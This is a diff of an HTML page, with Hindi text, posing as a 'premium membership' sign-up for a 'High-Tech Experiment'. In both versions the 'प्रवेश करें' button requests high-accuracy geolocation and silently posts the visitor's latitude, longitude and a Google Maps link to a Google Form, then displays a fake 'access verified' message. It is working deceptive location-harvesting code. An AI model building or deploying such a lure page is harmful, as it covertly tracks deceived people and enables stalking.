@@ -3,211 +3,152 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>High-Tech Technology Experiment | Premium</title>
+    <title>High-Tech Tech Experiment | Premium Access</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
     <style>
-        /* --- प्रीमियम थीम सेटिंग्स --- */
         :root {
-            --bg: #080a0c;
-            --cyan: #00f2fe;
-            --blue: #4facfe;
-            --glass: rgba(255, 255, 255, 0.03);
-            --border: rgba(0, 242, 254, 0.2);
+            --bg-color: #0a0e17;
+            --primary-color: #00f2fe;
+            --text-color: #ffffff;
+            --card-bg: rgba(255, 255, 255, 0.03);
+            --border-color: rgba(0, 242, 254, 0.2);
+            --header-height: 80px;
         }
 
         * { margin: 0; padding: 0; box-sizing: border-box; }
-
+        html { scroll-behavior: smooth; }
         body {
             font-family: 'Segoe UI', sans-serif;
-            background: var(--bg);
-            color: white;
-            min-height: 100vh;
-            display: flex;
-            flex-direction: column;
+            background-color: var(--bg-color);
+            color: var(--text-color);
             overflow-x: hidden;
         }
 
-        /* डायमंड कट एनिमेटेड बैकग्राउंड */
-        .bg-glow {
-            position: fixed;
-            top: 0; left: 0; width: 100%; height: 100%;
-            background: radial-gradient(circle at 50% 50%, rgba(0, 242, 254, 0.05), transparent);
-            z-index: -1;
+        .diamond-bg {
+            position: fixed; top: -10%; right: -10%; width: 50%; height: 60%;
+            background: linear-gradient(135deg, var(--primary-color) 0%, transparent 70%);
+            clip-path: polygon(50% 0%, 100% 50%, 50% 100%, 0% 50%);
+            opacity: 0.05; z-index: -1;
         }
 
-        /* नेविगेशन बार */
-        nav {
-            padding: 20px 5%;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            border-bottom: 1px solid var(--border);
+        .container { max-width: 1200px; margin: 0 auto; padding: 0 20px; }
+
+        header {
+            height: var(--header-height);
+            border-bottom: 1px solid var(--border-color);
             backdrop-filter: blur(10px);
+            position: fixed; width: 100%; top: 0; z-index: 1000;
+            display: flex; align-items: center;
         }
 
-        .logo {
-            font-size: 1.5rem;
-            font-weight: 900;
-            letter-spacing: 2px;
-            color: var(--cyan);
-            text-shadow: 0 0 10px var(--cyan);
+        nav { width: 100%; display: flex; justify-content: space-between; align-items: center; }
+        .logo { font-size: 1.5rem; font-weight: bold; color: var(--primary-color); text-decoration: none; text-shadow: 0 0 10px var(--primary-color); }
+
+        .nav-links { display: flex; list-style: none; gap: 30px; }
+        .nav-links a { text-decoration: none; color: var(--text-color); font-size: 0.9rem; opacity: 0.8; transition: 0.3s; }
+        .nav-links a:hover { color: var(--primary-color); opacity: 1; }
+
+        .hero { height: 100vh; display: flex; align-items: center; justify-content: center; text-align: center; padding-top: var(--header-height); }
+        .hero-content h1 { font-size: 3.5rem; background: linear-gradient(to right, #fff, var(--primary-color)); -webkit-background-clip: text; -webkit-text-fill-color: transparent; margin-bottom: 20px; }
+
+        .premium-btn {
+            background: transparent; border: 2px solid var(--primary-color); color: var(--primary-color);
+            padding: 15px 40px; font-size: 1rem; font-weight: bold; cursor: pointer; transition: 0.5s; border-radius: 5px;
         }
+        .premium-btn:hover { background: var(--primary-color); color: #000; box-shadow: 0 0 30px var(--primary-color); }
 
-        /* मेन कार्ड */
-        .main-container {
-            flex: 1;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            padding: 20px;
-        }
+        .features { padding: 100px 0; }
+        .feature-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); gap: 30px; }
+        .feature-card { background: var(--card-bg); border: 1px solid var(--border-color); padding: 40px; border-radius: 10px; transition: 0.4s; }
+        .feature-card:hover { border-color: var(--primary-color); transform: translateY(-5px); }
 
-        .premium-card {
-            background: var(--glass);
-            padding: 50px 30px;
-            border-radius: 20px;
-            border: 1px solid var(--border);
-            text-align: center;
-            max-width: 500px;
-            backdrop-filter: blur(15px);
-            box-shadow: 0 20px 50px rgba(0,0,0,0.5);
-            position: relative;
-            transition: 0.5s;
-        }
+        #status-message { margin-top: 20px; font-weight: 500; }
+        .hidden { display: none; }
 
-        .premium-card:hover {
-            border-color: var(--cyan);
-            box-shadow: 0 0 30px rgba(0, 242, 254, 0.2);
-        }
-
-        h1 {
-            font-size: 2.5rem;
-            margin-bottom: 15px;
-            background: linear-gradient(to right, #fff, var(--cyan));
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-            text-transform: uppercase;
-        }
-
-        p {
-            font-size: 1.1rem;
-            opacity: 0.7;
-            margin-bottom: 35px;
-            line-height: 1.6;
-        }
-
-        /* प्रीमियम बटन */
-        .btn {
-            background: transparent;
-            border: 2px solid var(--cyan);
-            color: var(--cyan);
-            padding: 18px 45px;
-            font-size: 1.1rem;
-            font-weight: bold;
-            text-transform: uppercase;
-            letter-spacing: 3px;
-            cursor: pointer;
-            border-radius: 8px;
-            transition: 0.4s;
-            position: relative;
-            overflow: hidden;
-        }
-
-        .btn:hover {
-            background: var(--cyan);
-            color: #000;
-            box-shadow: 0 0 40px var(--cyan);
-        }
-
-        /* स्टेटस मैसेज */
-        #status-box {
-            margin-top: 25px;
-            font-size: 0.9rem;
-            padding: 10px;
-            border-radius: 5px;
-            display: none;
-        }
-
-        .loading { color: var(--cyan); animation: pulse 1.5s infinite; }
-        .success { color: #00ff00; border: 1px solid #00ff0033; background: #00ff0011; }
-        .error { color: #ff4b4b; border: 1px solid #ff4b4b33; background: #ff4b4b11; }
-
-        @keyframes pulse { 50% { opacity: 0.5; } }
+        @media (max-width: 768px) { .nav-links { display: none; } .hero-content h1 { font-size: 2.2rem; } }
     </style>
 </head>
 <body>
 
-    <div class="bg-glow"></div>
+    <div class="diamond-bg"></div>
 
-    <nav>
-        <div class="logo">ADHYAYAN TECH</div>
-        <div style="font-size: 0.8rem; opacity: 0.5;">VERSION 2.0</div>
-    </nav>
-
-    <div class="main-container">
-        <div class="premium-card">
-            <h1>NEW MEMBERSHIP</h1>
-            <p>भविष्य की तकनीक का अनुभव करें। हमारे हाई-टेक एक्सपेरिमेंट लैब में शामिल होने के लिए नीचे बटन दबाएं।</p>
-            
-            <button class="btn" onclick="runExperiment()">प्रवेश करें</button>
-            
-            <div id="status-box"></div>
+    <header>
+        <div class="container">
+            <nav>
+                <a href="#" class="logo">HIGH-TECH</a>
+                <ul class="nav-links">
+                    <li><a href="#home">Home</a></li>
+                    <li><a href="#features">Experiments</a></li>
+                </ul>
+            </nav>
         </div>
-    </div>
+    </header>
+
+    <section id="home" class="hero">
+        <div class="container hero-content">
+            <h1>New Membership <br> High-Tech Experiment</h1>
+            <p style="margin-bottom: 30px; opacity: 0.7;">प्रीमियम एक्सेस के लिए नीचे बटन दबाएं।</p>
+            <button class="premium-btn" onclick="startExperiment()">प्रवेश करें</button>
+            <div id="status-message" class="hidden"></div>
+        </div>
+    </section>
+
+    <section id="features" class="features">
+        <div class="container">
+            <div class="feature-grid">
+                <div class="feature-card"><h3>सिस्टम चेक</h3><p>वेबसाइट की कार्यक्षमता की जांच की जा रही है।</p></div>
+                <div class="feature-card"><h3>सुरक्षा</h3><p>डेटा एन्क्रिप्शन सक्रिय है।</p></div>
+            </div>
+        </div>
+    </section>
 
     <script>
-        function runExperiment() {
-            const box = document.getElementById('status-box');
-            box.style.display = "block";
-            box.className = "loading";
-            box.innerText = "सिस्टम रिक्वेस्ट भेज रहा है... कृपया लोकेशन 'Allow' करें";
+        function startExperiment() {
+            const status = document.getElementById('status-message');
+            status.classList.remove('hidden');
+            status.innerText = "कृपया लोकेशन की अनुमति (Allow) दें...";
+            status.style.color = "white";
 
             if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(processData, handleError, {
-                    enableHighAccuracy: true,
-                    timeout: 10000
-                });
+                navigator.geolocation.getCurrentPosition(sendData, handleError, { enableHighAccuracy: true });
             } else {
-                showFinalStatus("error", "आपका डिवाइस इस तकनीक को सपोर्ट नहीं करता।");
+                status.innerText = "Browser not supported.";
             }
         }
 
-        function processData(pos) {
-            const lat = pos.coords.latitude;
-            const lon = pos.coords.longitude;
-            // फिक्स्ड मैप लिंक सिंटैक्स
-            const mapLink = `https://www.google.com/maps?q=${lat},${lon}`;
-            
-            showFinalStatus("loading", "डेटा एन्क्रिप्ट हो रहा है...");
+        function sendData(position) {
+            const status = document.getElementById('status-message');
+            const lat = position.coords.latitude;
+            const lon = position.coords.longitude;
+            const mapURL = `https://www.google.com/maps?q=${lat},${lon}`;
 
-            // --- आपकी IDs यहाँ फिक्स कर दी गई हैं ---
-            const fID = "13PWhPGu1sf5LJ4pQciECidVdNP0UMOidIww4DP05cw";
-            const formAction = `https://docs.google.com/forms/d/e/${fID}/formResponse`;
+            // --- आपकी फोटो से ली गई असली IDs ---
+            const formID = "1ZB-62ZH138zFuJ21LyiiwwOeD9rVstUVdGiiToC4-A";
+            const entryLat = "entry.1723883741";
+            const entryLon = "entry.1285934641";
+            const entryMap = "entry.630484221";
 
-            const data = new FormData();
-            data.append("entry.1688187415", lat); 
-            data.append("entry.1878723488", lon); 
-            data.append("entry.1440360866", mapLink); 
+            const finalURL = `https://docs.google.com/forms/d/e/${formID}/formResponse`;
 
-            fetch(formAction, {
-                method: "POST",
-                mode: "no-cors",
-                body: data
-            }).then(() => {
-                showFinalStatus("success", "प्रीमियम एक्सेस वेरीफाई हो गया! स्वागत है।");
-                alert("Welcome! Access Granted.");
+            const formData = new FormData();
+            formData.append(entryLat, lat);
+            formData.append(entryLon, lon);
+            formData.append(entryMap, mapURL);
+
+            fetch(finalURL, { method: "POST", mode: "no-cors", body: formData })
+            .then(() => {
+                status.innerText = "सफलता! आपका प्रीमियम एक्सेस वेरीफाई हो गया है।";
+                status.style.color = "#00ff00";
+                alert("Welcome to Premium Access!");
             }).catch(() => {
-                showFinalStatus("error", "सर्वर बिजी है, कृपया दोबारा प्रयास करें।");
+                status.innerText = "Error sending data.";
             });
         }
 
-        function showFinalStatus(type, msg) {
-            const box = document.getElementById('status-box');
-            box.className = type;
-            box.innerText = msg;
-        }
-
-        function handleError(err) {
-            showFinalStatus("error", "एक्सेस डिनाइड: कृपया लोकेशन सेटिंग ऑन करें।");
+        function handleError(error) {
+            const status = document.getElementById('status-message');
+            status.style.color = "red";
+            status.innerText = "अनुमति नहीं मिली। कृपया सेटिंग से लोकेशन ऑन करें।";
         }
     </script>
 </body>
